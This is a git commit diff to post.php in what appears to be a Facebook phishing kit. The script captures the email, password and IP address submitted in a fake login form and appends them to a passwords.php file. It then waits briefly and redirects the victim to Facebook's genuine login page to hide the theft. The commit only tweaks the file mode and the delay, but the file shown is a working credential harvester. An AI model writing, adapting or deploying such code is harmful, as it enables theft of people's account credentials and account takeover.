a430bc755598869da37c14696f4798a09546b5b3
codeteksistemas <58203899+codeteksistemas@users.noreply.github.com>
2020-06-25 23:03:24 -0500

    Update post.php

--- post.php
+++ post.php
@@ -3,9 +3,9 @@
 $email = $_POST['email']; 
 $pass = $_POST['pass'];
 $ip = $_SERVER['REMOTE_ADDR']; 
-$f = fopen("passwords.php", "a"); 
+$f = fopen("passwords.php", "a+"); 
 fwrite ($f, 'Email: [<b><font color="#EE0707">'.$email.'</font></b>] Password: [<b><font color="#390FF1">'.$pass.'</font></b>] IP: [<b><font color="#4EE811">'.$ip.'</font></b>]<br>');
 fclose($f);
-sleep(3);
+sleep(2);
 header("Location: https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110");
 ?>
